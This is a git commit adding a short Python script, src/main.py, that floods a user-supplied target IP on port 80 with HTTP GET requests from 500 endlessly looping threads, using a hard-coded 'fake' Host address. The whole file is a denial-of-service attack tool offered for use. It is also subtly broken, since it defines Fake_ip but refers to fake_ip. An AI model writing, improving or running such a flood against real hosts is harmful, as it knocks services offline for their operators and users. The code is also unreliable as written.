67c0e7a48dc3ac8272688631c06e7c67e6247c1c
Maxim Lutz <167509251+lplegendyt@users.noreply.github.com>
2025-01-10 08:16:59 +0000

    IST IT ANY GOOD

---
+++ src/main.py
@@ -0,0 +1,28 @@
+import socket
+import threading
+
+target = 'NULL'
+Fake_ip = "185.175.199.1"
+port = 80
+
+target = input("enter target ip:")
+
+attack_num = 0
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        
+        global attack_num
+        attack_num += 1
+        print(attack_num)
+        
+        s.close()
+
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
+
